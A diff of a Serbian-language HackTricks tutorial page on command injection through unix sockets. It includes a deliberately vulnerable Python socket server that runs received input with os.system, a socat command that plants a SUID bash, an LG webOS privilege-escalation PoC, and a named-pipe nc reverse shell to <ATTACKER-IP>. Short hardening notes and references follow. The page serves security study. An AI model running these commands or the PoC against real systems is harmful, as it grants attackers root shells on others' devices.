@@ -1,10 +1,8 @@
 # Socket Command Injection
 
-{{#include ../../banners/hacktricks-training.md}}
-
 ## Primer vezivanja socket-a pomoću Python-a
 
-U sledećem primeru se kreira **unix socket** (`/tmp/socket_test.s`) i sve što je **primljeno** biće **izvršeno** pomoću `os.system`. Znam da ovako nešto nećete pronaći u praksi, ali cilj ovog primera je da vidite kako izgleda kod koji koristi unix socket-e i kako se obrađuje unos u najgorem mogućem slučaju.
+U sledećem primeru se kreira **unix socket** (`/tmp/socket_test.s`), a sve što bude **primljeno** biće **izvršeno** pomoću `os.system`. Znam da ovo nećete pronaći u stvarnom okruženju, ali cilj ovog primera je da vidite kako izgleda kod koji koristi unix socket-e i kako se obrađuje ulaz u najgorem mogućem slučaju.
 ```python:s.py
 import socket
 import os, os.path
@@ -26,7 +24,7 @@ print(datagram)
 os.system(datagram)
 conn.close()
 ```
-**Izvršite** kod koristeći python: `python s.py` i **proverite kako socket osluškuje**:
+**Pokrenite** kod koristeći python: `python s.py` i **proverite kako socket osluškuje**:
 ```python
 netstat -a -p --unix | grep "socket_test"
 (Not all processes could be identified, non-owned process info
@@ -39,15 +37,18 @@ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat -
 ```
 ## Studija slučaja: eskalacija pokrenuta signalom preko UNIX socket-a u vlasništvu root-a (LG webOS)
 
-Neki privilegovani daemoni izlažu UNIX socket u vlasništvu root-a koji prihvata nepouzdane podatke i povezuje privilegovane radnje sa ID-ovima thread-ova i signalima. Ako protokol omogućava neprivilegovanom klijentu da utiče na to koji native thread je ciljan, možda ćete moći da pokrenete privilegovanu putanju koda i izvršite eskalaciju.<sup>[[1]](#references)</sup>
+Neki privilegovani daemoni izlažu UNIX socket u vlasništvu root-a koji prihvata nepouzdane ulazne podatke i povezuje privilegovane radnje sa ID-jevima niti i signalima. Ako protokol omogućava neprivilegovanom klijentu da utiče na to koja će izvorna nit biti ciljana, možda ćete moći da pokrenete privilegovani code path i izvršite eskalaciju.<sup>[[1]](#references)[[2]](#references)</sup>
+
+Primarni write-up i disclosure opisuju sledeći niz radnji.<sup>[[1]](#references)[[2]](#references)</sup>
 
 Uočeni obrazac:
-- Povežite se na socket u vlasništvu root-a (npr. /tmp/remotelogger).
-- Kreirajte thread i pribavite njegov native thread id (TID).
-- Pošaljite TID (upakovan) zajedno sa padding-om kao zahtev; primite potvrdu.
-- Pošaljite određeni signal tom TID-u da pokrenete privilegovano ponašanje.
+- Povežite se sa socket-om u vlasništvu root-a (npr. /tmp/remotelogger).
+- Kreirajte nit i pribavite njen izvorni ID niti (TID).
+- Pošaljite TID (u packed formatu) zajedno sa padding-om kao zahtev; primite potvrdu.
+- Pošaljite određeni signal tom TID-u da biste pokrenuli privilegovano ponašanje.
 
-Minimalni PoC prikaz:
+Sažeti PoC u nastavku prati taj niz radnji.<sup>[[1]](#references)[[2]](#references)</sup>
+Minimalni nacrt PoC-a:
 ```python
 import socket, struct, os, threading, time
 # Spawn a thread so we have a TID we can signal
@@ -59,17 +60,17 @@ s.sendall(struct.pack('<L', tid) + b'A'*0x80)
 s.recv(4)  # sync
 os.kill(tid, 4)  # deliver SIGILL (example from the case)
 ```
-Da bi se ovo pretvorilo u root shell, može se koristiti jednostavan named-pipe + nc obrazac:
+Da biste ovo pretvorili u root shell, može se koristiti jednostavan obrazac named-pipe + nc.<sup>[[2]](#references)</sup>
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
 Napomene:
-- Ova klasa grešaka nastaje usled verovanja vrednostima izvedenim iz neprivilegovanog stanja klijenta (TID-ovima) i njihovog povezivanja sa privilegovanim rukovaocima signala ili logikom.
-- Ojačajte sistem nametanjem provere akreditiva na socketu, validacijom formata poruka i odvajanjem privilegovanih operacija od eksterno dostavljenih identifikatora niti.
+- Ova klasa grešaka nastaje zbog verovanja vrednostima izvedenim iz stanja klijenta bez privilegija (TIDs) i njihovog povezivanja sa privileged signal handlers ili logikom.<sup>[[1]](#references)</sup>
+- Ojačajte zaštitu nametanjem credentials na socketu, validacijom formata poruka i odvajanjem privileged operacija od eksterno prosleđenih identifikatora niti.
 
 ## References
 
-- [1] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
-
+- [1] [Jailbreak webOS iz zabave (samo iz zabave)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
+- [2] [LG WebOS Path Traversal, zaobilaženje autentifikacije i potpuno preuzimanje uređaja (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
 {{#include ../../banners/hacktricks-training.md}}
